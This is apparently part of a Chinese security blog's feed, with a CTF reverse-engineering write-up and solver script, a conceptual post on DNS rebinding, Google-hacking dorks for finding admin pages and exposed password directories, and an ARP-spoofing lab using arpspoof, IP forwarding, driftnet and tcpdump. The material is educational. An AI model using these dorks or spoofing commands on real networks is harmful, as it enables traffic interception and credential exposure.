open!&quot;</span>);</span><br><span class="line">  sub_14001117C(v4, <span class="string">&quot;You&#x27;re our first customer!&quot;</span>);</span><br><span class="line">  sub_1400114CE(v5, <span class="string">&quot;We will give you a free lottery ticket, the number is: &quot;</span>);</span><br><span class="line">  sub_14001117C(v6, <span class="string">&quot;Please enter your choice &#123;1-5&#125;&quot;</span>);</span><br><span class="line">  sub_14001117C(v7, <span class="string">&quot;1.buy a lottery ticket&quot;</span>);</span><br><span class="line">  sub_14001117C(v8, <span class="string">&quot;2.Check to see if you won&quot;</span>);</span><br><span class="line">  sub_14001117C(v9, <span class="string">&quot;3.join us&quot;</span>);</span><br><span class="line">  sub_14001117C(v10, <span class="string">&quot;4.Take a sneak peek at the flag&quot;</span>);</span><br><span class="line">  sub_14001117C(v11, <span class="string">&quot;5.exit&quot;</span>);</span><br><span class="line">  sub_1400110FF(</span><br><span class="line">    (<span class="keyword">int</span>)v3,</span><br><span class="line">    (<span class="keyword">int</span>)v4,</span><br><span class="line">    (<span class="keyword">int</span>)v5,</span><br><span class="line">    (<span class="keyword">int</span>)v6,</span><br><span class="line">    (__int64)v7,</span><br><span class="line">    (__int64)v8,</span><br><span class="line">    (__int64)v9,</span><br><span class="line">    (__int64)v10,</span><br><span class="line">    (__int64)v11,</span><br><span class="line">    (__int64)v13,</span><br><span class="line">    (__int64)v15,</span><br><span class="line">    (__int64)v14);</span><br><span class="line">  <span class="keyword">while</span> ( <span class="number">1</span> )</span><br><span class="line">  &#123;</span><br><span class="line">    <span class="keyword">while</span> ( <span class="number">1</span> )</span><br><span class="line">    &#123;</span><br><span class="line">      sub_14001156E((<span class="keyword">int</span>)v7, (<span class="keyword">int</span>)v8, (<span class="keyword">int</span>)v9, (<span class="keyword">int</span>)v10, v11, v6);</span><br><span class="line">      sub_1400113CA(<span class="string">&quot;%d&quot;</span>, v12);</span><br><span class="line">      v16 = v12[<span class="number">0</span>];</span><br><span class="line">      <span class="keyword">if</span> ( v12[<span class="number">0</span>] != <span class="number">1</span> )</span><br><span class="line">        <span class="keyword">break</span>;</span><br><span class="line">      system(<span class="string">&quot;cls&quot;</span>);</span><br><span class="line">      sub_1400111EF(v15, (__int64)v14);</span><br><span class="line">      sub_1400111BD();</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">switch</span> ( v16 )</span><br><span class="line">    &#123;</span><br><span class="line">      <span class="keyword">case</span> <span class="number">2</span>:</span><br><span class="line">        system(<span class="string">&quot;cls&quot;</span>);</span><br><span class="line">        sub_140011708(v15, v14, (<span class="keyword">unsigned</span> <span class="keyword">int</span>)v13[<span class="number">0</span>]);</span><br><span class="line">        sub_1400111BD();</span><br><span class="line">        <span class="keyword">break</span>;</span><br><span class="line">      <span class="keyword">case</span> <span class="number">3</span>:</span><br><span class="line">        system(<span class="string">&quot;cls&quot;</span>);</span><br><span class="line">        sub_14001149C();</span><br><span class="line">        sub_1400111BD();</span><br><span class="line">        <span class="keyword">break</span>;</span><br><span class="line">      <span class="keyword">case</span> <span class="number">4</span>:</span><br><span class="line">        system(<span class="string">&quot;cls&quot;</span>);</span><br><span class="line">        sub_1400114E7();</span><br><span class="line">        sub_1400111BD();</span><br><span class="line">        <span class="keyword">break</span>;</span><br><span class="line">      <span class="keyword">case</span> <span class="number">5</span>:</span><br><span class="line">        system(<span class="string">&quot;cls&quot;</span>);</span><br><span class="line">        <span class="built_in">puts</span>(<span class="string">&quot;Welcome again&quot;</span>);</span><br><span class="line">        sub_1400111BD();</span><br><span class="line">        <span class="built_in">exit</span>(<span class="number">1</span>);</span><br><span class="line">      <span class="keyword">default</span>:</span><br><span class="line">        <span class="built_in">puts</span>(<span class="string">&quot;input error&quot;</span>);</span><br><span class="line">        sub_1400111BD();</span><br><span class="line">        <span class="keyword">break</span>;</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>这里并没有有关flag的信息，真正的flag在<code>sub_1400110FF</code>函数中</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br></pre></td><td class="code"><pre><span class="line"><span class="function">__int64 __fastcall <span class="title">sub_140016760</span><span class="params">(</span></span></span><br><span class="line"><span class="function"><span class="params">        __int64 a1,</span></span></span><br><span class="line"><span class="function"><span class="params">        __int64 a2,</span></span></span><br><span class="line"><span class="function"><span class="params">        __int64 a3,</span></span></span><br><span class="line"><span class="function"><span class="params">        __int64 a4,</span></span></span><br><span class="line"><span class="function"><span class="params">        _BYTE *a5,</span></span></span><br><span class="line"><span class="function"><span class="params">        __int64 a6,</span></span></span><br><span class="line"><span class="function"><span class="params">        __int64 a7,</span></span></span><br><span class="line"><span class="function"><span class="params">        __int64 a8,</span></span></span><br><span class="line"><span class="function"><span class="params">        _BYTE *a9,</span></span></span><br><span class="line"><span class="function"><span class="params">        _DWORD *a10,</span></span></span><br><span class="line"><span class="function"><span class="params">        <span class="keyword">int</span> *a11,</span></span></span><br><span class="line"><span class="function"><span class="params">        __int64 a12)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="keyword">unsigned</span> <span class="keyword">int</span> v12; <span class="comment">// eax</span></span><br><span class="line">  _BYTE *v14; <span class="comment">// [rsp+1E8h] [rbp+1C8h]</span></span><br><span class="line">  <span class="keyword">int</span> v15; <span class="comment">// [rsp+264h] [rbp+244h]</span></span><br><span class="line">  <span class="keyword">int</span> v16; <span class="comment">// [rsp+264h] [rbp+244h]</span></span><br><span class="line">  <span class="keyword">int</span> i; <span class="comment">// [rsp+284h] [rbp+264h]</span></span><br><span class="line">  <span class="keyword">int</span> v18; <span class="comment">// [rsp+2A4h] [rbp+284h]</span></span><br><span class="line">  <span class="keyword">int</span> j; <span class="comment">// [rsp+2C4h] [rbp+2A4h]</span></span><br><span class="line">  __int64 v20; <span class="comment">// [rsp+2E8h] [rbp+2C8h]</span></span><br><span class="line"></span><br><span class="line">  sub_140011690(&amp;unk_14002D06A);</span><br><span class="line">  v14 = (_BYTE *)sub_1400112AD(<span class="number">14</span>i64);</span><br><span class="line">  <span class="built_in">puts</span>((<span class="keyword">const</span> <span class="keyword">char</span> *)a1);</span><br><span class="line">  <span class="built_in">puts</span>((<span class="keyword">const</span> <span class="keyword">char</span> *)a2);</span><br><span class="line">  v14[<span class="number">9</span>] = *a5;</span><br><span class="line">  v14[<span class="number">2</span>] = v14[<span class="number">9</span>];</span><br><span class="line">  v14[<span class="number">1</span>] = *(_BYTE *)(a1 + <span class="number">10</span>) - <span class="number">12</span>;</span><br><span class="line">  v14[<span class="number">10</span>] = *(_BYTE *)(a3 + <span class="number">5</span>) - <span class="number">56</span>;</span><br><span class="line">  v14[<span class="number">7</span>] = *(_BYTE *)(a6 + <span class="number">15</span>) - <span class="number">10</span>;</span><br><span class="line">  v14[<span class="number">13</span>] = <span class="built_in">toupper</span>((<span class="keyword">char</span>)(*(_BYTE *)(a8 + <span class="number">3</span>) + <span class="number">3</span>));</span><br><span class="line">  v14[<span class="number">3</span>] = *(_BYTE *)(a2 + <span class="number">1</span>) + <span class="number">4</span>;</span><br><span class="line">  v14[<span class="number">11</span>] = <span class="built_in">toupper</span>((<span class="keyword">char</span>)(*(_BYTE *)(a7 + <span class="number">7</span>) - <span class="number">14</span>));</span><br><span class="line">  v14[<span class="number">4</span>] = v14[<span class="number">7</span>];</span><br><span class="line">  *v14 = <span class="built_in">tolower</span>((<span class="keyword">char</span>)(*a9 + <span class="number">31</span>));</span><br><span class="line">  v14[<span class="number">8</span>] = <span class="built_in">toupper</span>(*(<span class="keyword">char</span> *)(a8 + <span class="number">27</span>));</span><br><span class="line">  v14[<span class="number">5</span>] = <span class="built_in">toupper</span>((<span class="keyword">char</span>)(*(_BYTE *)(a4 + <span class="number">13</span>) - <span class="number">16</span>));</span><br><span class="line">  v14[<span class="number">6</span>] = v14[<span class="number">3</span>];</span><br><span class="line">  v14[<span class="number">12</span>] = a5[<span class="number">6</span>] - <span class="number">39</span>;</span><br><span class="line">  v12 = sub_1400180A0(<span class="number">0</span>i64);</span><br><span class="line">  srand(v12);</span><br><span class="line">  v15 = <span class="number">1</span>;</span><br><span class="line">  <span class="keyword">for</span> ( i = <span class="number">0</span>; i &lt; <span class="number">8</span>; ++i )</span><br><span class="line">  &#123;</span><br><span class="line">    v18 = rand() % <span class="number">10</span>;</span><br><span class="line">    <span class="keyword">if</span> ( i != <span class="number">7</span> || v18 )</span><br><span class="line">    &#123;</span><br><span class="line">      *a10 += v18 * v15;</span><br><span class="line">      v15 *= <span class="number">10</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span></span><br><span class="line">    &#123;</span><br><span class="line">      --i;</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">  v16 = <span class="number">1</span>;</span><br><span class="line">  <span class="keyword">for</span> ( j = <span class="number">0</span>; j &lt; <span class="number">8</span>; ++j )</span><br><span class="line">  &#123;</span><br><span class="line">    v20 = rand() % <span class="number">10</span>;</span><br><span class="line">    <span class="keyword">if</span> ( j != <span class="number">7</span> || v20 )</span><br><span class="line">    &#123;</span><br><span class="line">      <span class="keyword">if</span> ( j )</span><br><span class="line">        *(_QWORD *)(a12 + <span class="number">8</span>i64 * *a11) += v20 * v16;</span><br><span class="line">      <span class="keyword">else</span></span><br><span class="line">        *(_QWORD *)(a12 + <span class="number">8</span>i64 * *a11) = v20;</span><br><span class="line">      v16 *= <span class="number">10</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span></span><br><span class="line">    &#123;</span><br><span class="line">      --j;</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">return</span> sub_1400112E9(<span class="string">&quot;%s %d\n&quot;</span>, (<span class="keyword">const</span> <span class="keyword">char</span> *)a3, *(_QWORD *)(a12 + <span class="number">8</span>i64 * (*a11)++));</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>真正的flag在v14变量中，是根据已有的变量变换得到的</p><p>exp</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br></pre></td><td class="code"><pre><span class="line">v3 = <span class="string">&quot;Sloth&#x27;s lottery shop is open!&quot;</span></span><br><span class="line">v4 = <span class="string">&quot;You&#x27;re our first customer!&quot;</span></span><br><span class="line">v5 = <span class="string">&quot;We will give you a free lottery ticket, the number is: &quot;</span></span><br><span class="line">v6 = <span class="string">&quot;Please enter your choice &#123;1-5&#125;&quot;</span></span><br><span class="line">v7 = <span class="string">&quot;1.buy a lottery ticket&quot;</span></span><br><span class="line">v8 = <span class="string">&quot;2.Check to see if you won&quot;</span></span><br><span class="line">v9 = <span class="string">&quot;3.join us&quot;</span></span><br><span class="line">v10 = <span class="string">&quot;4.Take a sneak peek at the flag&quot;</span></span><br><span class="line">v11 = <span class="string">&quot;5.exit&quot;</span></span><br><span class="line">v13 = [<span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">10</span>]</span><br><span class="line">v15 = [<span class="number">0</span>] * <span class="number">10</span></span><br><span class="line">v14 = [<span class="number">0</span>] * <span class="number">10</span></span><br><span class="line"></span><br><span class="line">V14 = [<span class="number">0</span>] * <span class="number">14</span></span><br><span class="line"></span><br><span class="line">V14[<span class="number">9</span>] = v7[<span class="number">0</span>]</span><br><span class="line">V14[<span class="number">2</span>] = V14[<span class="number">9</span>]</span><br><span class="line">V14[<span class="number">1</span>] = <span class="built_in">chr</span>(<span class="built_in">ord</span>(v3[<span class="number">10</span>])<span class="number">-12</span>)</span><br><span class="line">V14[<span class="number">10</span>] = <span class="built_in">chr</span>(<span class="built_in">ord</span>(v5[<span class="number">5</span>]) - <span class="number">56</span>)</span><br><span class="line">V14[<span class="number">7</span>] = <span class="built_in">chr</span>(<span class="built_in">ord</span>(v8[<span class="number">15</span>]) - <span class="number">10</span>)</span><br><span class="line">V14[<span class="number">13</span>] = <span class="built_in">chr</span>(<span class="built_in">ord</span>(v10[<span class="number">3</span>]) + <span class="number">3</span>).upper()<span class="comment">#</span></span><br><span class="line">V14[<span class="number">3</span>] = <span class="built_in">chr</span>(<span class="built_in">ord</span>(v4[<span class="number">1</span>]) + <span class="number">4</span>)</span><br><span class="line">V14[<span class="number">11</span>] = <span class="built_in">chr</span>(<span class="built_in">ord</span>(v9[<span class="number">7</span>])<span class="number">-14</span>).upper()<span class="comment">#</span></span><br><span class="line">V14[<span class="number">4</span>] = (V14[<span class="number">7</span>])</span><br><span class="line">V14[<span class="number">0</span>] = <span class="built_in">chr</span>(<span class="built_in">ord</span>(v11[<span class="number">0</span>])+<span class="number">31</span>).lower()<span class="comment">#l</span></span><br><span class="line">V14[<span class="number">8</span>] = (v10[<span class="number">27</span>]).upper()<span class="comment">#</span></span><br><span class="line">V14[<span class="number">5</span>] = <span class="built_in">chr</span>(<span class="built_in">ord</span>(v6[<span class="number">13</span>])<span class="number">-16</span>).upper()<span class="comment">#</span></span><br><span class="line">V14[<span class="number">6</span>] = V14[<span class="number">3</span>]</span><br><span class="line">V14[<span class="number">12</span>] = <span class="built_in">chr</span>(<span class="built_in">ord</span>(v7[<span class="number">6</span>])<span class="number">-39</span>)</span><br><span class="line"></span><br><span class="line">print(<span class="string">&#x27;&#x27;</span>.join(V14))</span><br></pre></td></tr></table></figure><p><code>XSCTF&#123;th1s_Is_F14G:D&#125;</code></p>]]></content>
      
      
      
        <tags>
            
            <tag> ctf </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>DNS重绑定</title>
      <link href="2022/04/17/dns_rebinding_attack/"/>
      <url>2022/04/17/dns_rebinding_attack/</url>
      
        <content type="html"><![CDATA[<h2 id="DNS重绑定"><a href="#DNS重绑定" class="headerlink" title="DNS重绑定"></a>DNS重绑定</h2><p>DNS重绑定指的是在用户访问域名时更改域名指向的IP从而令用户访问指定IP的攻击手法</p><hr><p><strong>DNS</strong>：由于网络传输需要IP地址，故需要DNS（Domian Name Server）用于查询给定域名指向的IP</p><p><strong>同源策略</strong>（The Same-origin Policy）：</p><blockquote><p>The same-origin policy restricts which network messages one origin can send to another. For example, the same-origin policy allows inter-origin HTTP requests with GET and POST methods but denies inter-origin PUT and DELETE requests. Additionally, origins can use custom HTTP headers when sending requests to themselves but cannot use custom headers when sending requests to other origins.</p><p>The restrictions on reading information received from other origins is also somewhat subtle. For example, the HTML &lt;script&gt; element can execute content retrieved from foreign origins, which means web sites should not rely on the same-origin policy to protect the confidentiality of information in a format that happens to parse as script (e.g., JavaScript source files, JSON format, JSONP services, or <a href="http://www.thinkfu.com/blog/?p=15">JavaScript/gif polyglots</a>). For all such resources, no loss of security would result (and much flexibility would be gained) from adding the Access-Control-Allow-Origin:* header to all responses.</p></blockquote><p>以上解释来自于<a href="https://www.w3.org/Security/wiki/Same_Origin_Policy">Same Origin Policy - Web Security (w3.org)</a></p><p><a href="https://www.helloimg.com/image/RnPgwo"><img src="https://www.helloimg.com/images/2022/04/17/RnPgwo.png" class="lazyload" data-srcset="https://www.helloimg.com/images/2022/04/17/RnPgwo.png" srcset="data:image/png;base64,666" alt="RnPgwo.png"></a></p><p>简单来说，为了防止淘宝网带着你的账户信息访问京东，需要同源策略来限制不同网站之间的访问规范</p><hr><p>​    可以看出同源的要求是“协议+端口+域名/ip”，而如果以域名访问网站（通常的做法）时同源策略就变成了“协议+端口+域名”这就给了DNS重绑定攻击实现的可能</p><p>要实现DNS重绑定攻击，攻击者需要具备以下条件：</p><ul>    <li>诱使用户点击给定链接（钓鱼邮件、钓鱼短信、社工等）</li>    <li>可控的DNS服务器（自己搭建一个或者抢一个）</li></ul><p>​    DNS重绑定攻击会诱使用户访问一个域名，在用户第一次访问时以正常的IP进行通信，并且在返回的DNS查询结果中将TTL设置为1或其他比较小的数字，在诱使用户以点击等行为构造好恶意请求时，攻击者一般会修改DNS服务器上该域名指向的IP，从而将恶意请求发送至攻击者指定的IP；</p><blockquote><p>TTL（Time To Live）指的是dns查询结果的有效时间，通过修改TTL为一个较小的值从而实现受害者与DNS服务器的频繁通信，从而保证在修改域名指向的IP时能立即生效</p></blockquote><hr><p>​    易受攻击的设备：一般是位于内网的智能家居设备，由于攻击者无法从外网访问受害者的内网，故以此种攻击伪造身份访问内网（SSRF）；比如恒温器，若在一个只有老人的场所中，这种攻击往往是致命的</p><blockquote><p>quote<br><a href="https://www.w3.org/Security/wiki/Same_Origin_Policy">Same Origin Policy - Web Security (w3.org)</a><br><a href="https://zhuanlan.zhihu.com/p/45583472">利用DNS重绑定攻击专用网络 - 知乎 (zhihu.com)</a><br><a href="https://xz.aliyun.com/t/7495">从0到1认识DNS重绑定攻击 - 先知社区 (aliyun.com)</a></p></blockquote>]]></content>
      
      
      
        <tags>
            
            <tag> Internet </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>GoogleHacking</title>
      <link href="2022/04/09/google_hacking/"/>
      <url>2022/04/09/google_hacking/</url>
      
        <content type="html"><![CDATA[<h2 id="Google-Hacking"><a href="#Google-Hacking" class="headerlink" title="Google Hacking"></a>Google Hacking</h2><p>Google hacking是一系列用于高效运用搜索引擎的技巧，也可以用于测试漏洞等用处</p><p>A and B</p><p>逻辑与，用于查找同时包含A和B的内容</p><p>A or B</p><p>逻辑或，用于查找包含A或包含B或同时包含A和B的内容</p><p>A -B</p><p>逻辑非，用于查找A但不包含B的内容</p><p>“xxx yyy”</p><p>完整匹配，用于查找带有完整xxx yyy的内容</p><p>site:xxx.com yyy</p><p>指定搜索范围，用于搜索特定范围（xxx.com）内有关yyy的内容</p><p>filetype:txt xxx</p><p>指定搜索文件类型，用于搜索有关xxx的txt文件</p><p>inurl:aaa</p><p>搜索匹配网址中带aaa的内容</p><p>allinurl: aaa bbb</p><p>与inurl相似，只不过可以指定多个关键词</p><p>intext:aaa xxx</p><p>搜索匹配网页正文中带aaa的且有关xxx的内容</p><p>intitle:xxx</p><p>搜索匹配网页的标题中包含xxx的内容</p><p>xxx*</p><p>使用通配符*搜索有关以xxx为前缀的内容</p><p>link:xxx.com</p><p>返回所有指向xxx.com的网页</p><p>related:xxx.com</p><p>返回所有与xxx.com相似的网页（指布局相似）</p><p>cache:xxx.com [yyy]</p><p>返回搜索引擎有关xxx.com的缓存，如果加上关键词，则网页中的关键词会被高亮</p><p>info:<a href="http://www.xxx.com/">www.xxx.com</a></p><p>返回有关站点<a href="http://www.xxx.com的相关信息/">www.xxx.com的相关信息</a></p><p>define:xxx</p><p>返回有关xxx的定义</p><p>Index of /xxx</p><p>返回允许当作目录访问的网页</p><h2 id="一些技巧："><a href="#一些技巧：" class="headerlink" title="一些技巧："></a>一些技巧：</h2><h3 id="查找网站后台"><a href="#查找网站后台" class="headerlink" title="查找网站后台"></a>查找网站后台</h3><p>site:xx.com intext:管理</p><p>site:xx.com inurl:login</p><p>site:xx.com intitle:后台</p><h3 id="查看服务器使用的程序"><a href="#查看服务器使用的程序" class="headerlink" title="查看服务器使用的程序"></a>查看服务器使用的程序</h3><p>site:xx.com filetype:asp</p><p>site:xx.com filetype:php</p><p>site:xx.com filetype:jsp</p><p>site:xx.com filetype:aspx</p><h3 id="查看上传漏洞"><a href="#查看上传漏洞" class="headerlink" title="查看上传漏洞"></a>查看上传漏洞</h3><p>site:xx.com inurl:file</p><p>site:xx.com inurl:load</p><h3 id="查看可访问目录"><a href="#查看可访问目录" class="headerlink" title="查看可访问目录"></a>查看可访问目录</h3><p>index of /admin</p><p>index of /passwd</p><p>index of /password</p><p>index of /mail</p><p>“index of /“ +passwd</p><p>“index of /“ +password.txt</p><p>“index of /“ +.htaccess</p><p>“index of /root”</p><p>“index of /cgi-bin”</p><p>“index of /logs”</p><p>“index of /config”</p><blockquote><p>quote<br><a href="https://blog.csdn.net/weixin_51339377/article/details/124005136">Google-Hacking 语法笔记_Simon_Smith的博客-CSDN博客</a></p><p><a href="https://blog.csdn.net/qq_35733751/article/details/105258082">2-信息收集—Google hacking_songly_的博客-CSDN博客</a></p><p><a href="https://blog.csdn.net/qq_36119192/article/details/84029809">信息收集之Google Hacking的简单用法_谢公子的博客-CSDN博客_google hacking</a></p><p><a href="https://blog.csdn.net/huweiliyi/article/details/105442118">Google Hacking使用详解_Teacher.Hu的博客-CSDN博客_google hacking</a></p></blockquote>]]></content>
      
      
      
        <tags>
            
            <tag> Internet </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>arp欺骗初次尝试</title>
      <link href="2022/04/03/arp_cheat/"/>
      <url>2022/04/03/arp_cheat/</url>
      
        <content type="html"><![CDATA[<h2 id="ARP欺骗是什么"><a href="#ARP欺骗是什么" class="headerlink" title="ARP欺骗是什么"></a>ARP欺骗是什么</h2><p>ARP欺骗（ARP spoofing），又称ARP毒化（ARP poisoning，网络上多译为ARP病毒）或ARP攻击，是针对<a href="https://baike.baidu.com/item/%E4%BB%A5%E5%A4%AA%E7%BD%91">以太网</a><a href="https://baike.baidu.com/item/%E5%9C%B0%E5%9D%80%E8%A7%A3%E6%9E%90%E5%8D%8F%E8%AE%AE">地址解析协议</a>（<a href="https://baike.baidu.com/item/ARP">ARP</a>）的一种攻击技术，通过欺骗局域网内访问者PC的网关MAC地址，使访问者PC错以为攻击者更改后的MAC地址是网关的MAC，导致网络不通。此种攻击可让攻击者获取<a href="https://baike.baidu.com/item/%E5%B1%80%E5%9F%9F%E7%BD%91">局域网</a>上的数据包甚至可篡改数据包，且可让网络上特定计算机或所有计算机无法正常连线。</p><p>以上来自百度百科</p><h2 id="个人理解"><a href="#个人理解" class="headerlink" title="个人理解"></a>个人理解</h2><p>大概原理就是在每台用于上网的机器中都会有一张叫arp缓存表的东西，里边记录了ip地址与mac地址（物理地址）的映射关系</p><p>这张表的形成过程如下：</p><p>假设现在我要与ip地址为192.168.1.2的主机通信，我就向局域网内的所有主机广播消息“谁是192.168.1.2 ？”，这时如果该ip的主机收到了广播，就会向发出广播的主机回应“192.168.1.2是我，我的mac地址是xxx”，然后发出广播的主机就将该ip和该mac地址记录到本机的arp缓存表中</p><p>而arp欺骗要做的，就是假装自己是某一台被请求的主机，把自己的mac地址与被假装主机的ip绑定起来记录在别人的arp缓存表中；由于网络的实际传输是通过mac地址进行寻址的，这样所有发送到被假装主机的信息都会通过mac地址发送到恶意主机上</p><h2 id="具体过程"><a href="#具体过程" class="headerlink" title="具体过程"></a>具体过程</h2><p>设备：手机一台，电脑一台，树莓派一个</p><p>说明：</p><ul>    <li>手机充当受害者（ip：192.168.137.116）</li>    <li>电脑充当网关（开热点 ip：192.168.137.1）</li>    <li>树莓派作为攻击机器（ip：192.168.137.66）</li></ul><p>使用程序：arpspoof(需要安装dsniff与ssldump)，tcpdump，driftnet</p><blockquote><p>为什么需要树莓派？</p><p>本来打算用vmware模拟所有的主机的，但是由于局域网的配置问题无法用vmware模拟所有机器，模拟一部分的话又会因为局域网的问题导致虚拟机与物理机无法进行正常通信，所以就拿出了我吃灰多年的原生树莓派</p></blockquote><p>首先使用nmap扫描受害者</p><p><a href="https://www.helloimg.com/image/RJkmoX"><img src="https://www.helloimg.com/images/2022/04/03/RJkmoX.png" class="lazyload" data-srcset="https://www.helloimg.com/images/2022/04/03/RJkmoX.png" srcset="data:image/png;base64,666" alt="RJkmoX.png"></a></p><p>确定了受害者的ip之后使用命令</p><p>arpspoof -i [网卡（此处为wlan0）] -t [目标ip] [网关ip]</p><p>进行欺骗</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sudo arpspoof -i wlan0 -t 192.168.137.116 192.168.137.1</span><br></pre></td></tr></table></figure><p>如果仅仅只是想对目标主机进行断网操作的话无需其他操作，但是如果想进行双向的欺骗（中间人攻击），就必须打开树莓派的转发功能，命令如下：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">echo</span> 1 &gt; /proc/sys/net/ipv4/ip_forward</span><br></pre></td></tr></table></figure><p>然后再打开另一个窗口，安装driftnet</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">sudo apt install driftnet</span><br><span class="line">sudo driftnet -i [监听网卡] -a -d [截取的图片的存放目录]</span><br></pre></td></tr></table></figure><p>这样就可以获取受害者此时的图片了</p><p><a href="https://www.helloimg.com/image/RJkHXz"><img src="https://www.helloimg.com/images/2022/04/03/RJkHXz.png" class="lazyload" data-srcset="https://www.helloimg.com/images/2022/04/03/RJkHXz.png" srcset="data:image/png;base64,666" alt="RJkHXz.png"></a></p><blockquote><p>如果用树莓派查看图片不方便，可以打开80端口，把图片放到网站根目录下再从浏览器访问</p></blockquote><p>实际上在我进行实验时，截图获取得并不是很顺利，所以我选择了另外一种获取通信信息的方式——tcpdump</p><p>在arpspoof命令运行的时候，由于受害者与网关的所有通信都会经过攻击机的网卡，故我们可以用tcpdump来获取本地网卡接收到的信息。命令如下：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sudo tcpdump -i wlan0 -s 0 -w e.cap</span><br></pre></td></tr></table></figure><p>wlan0是网卡，e.cap是抓包存放的文件名称，回车之后便开始抓包，等到什么时候觉得差不多了就crtl+C停止就行，此时在当前目录下应该会出现刚刚抓包的文件（此处为e.cap），可以使用以下命令读取：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sudo tcpdump -A -r e.cap </span><br></pre></td></tr></table></figure><p>-A是以ascii形式显示 -r后面的是要打开的文件，除了这种打开方式，还有类似过滤器的功能</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sudo tcpdump -n dst host 119.91.135.95 -r e.cap</span><br></pre></td></tr></table></figure><p>该命令过滤了ip为119.91.135.95的通信信息并显示在屏幕上</p><p><a href="https://www.helloimg.com/image/RJkDzS"><img src="https://www.helloimg.com/images/2022/04/03/RJkDzS.png" class="lazyload" data-srcset="https://www.helloimg.com/images/2022/04/03/RJkDzS.png" srcset="data:image/png;base64,666" alt="RJkDzS.png"></a></p><p>以上是传输过程中截取的信息</p><blockquote><p>quote<br><a href="https://baike.baidu.com/item/ARP%E6%AC%BA%E9%AA%97/2805503">ARP欺骗_百度百科 (baidu.com)</a></p><p><a href="https://www.cnblogs.com/longliz/p/15040093.html">kaili linux使用arpspoof进行arp欺骗 - 闻所未闻 - 博客园 (cnblogs.com)</a></p><p><a href="https://blog.csdn.net/mr__sheng/article/details/123757426">ARP–利用arpspoof和driftnet工具进行arp欺骗_mr_xiuk的博客-CSDN博客_arpspoof</a></p><p><a href="https://blog.51cto.com/u_14354846/2408291">kali linux操作系统中TCPDUMP详细使用方法_隔壁老湿的技术博客_51CTO博客</a></p><p><a href="https://blog.csdn.net/weixin_39190897/article/details/104569308">Kali渗透-ARP断网攻击与监听_Tr0e的博客-CSDN博客_kali局域网渗透监控</a></p><p><a href="https://www.cnblogs.com/0day-li/p/6059297.html">kali linux下的arp攻击 - 逗比大师 - 博客园 (cnblogs.com)</a></p></blockquote>]]></content>
      
      
      
        <tags>
            
            <tag> Internet </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
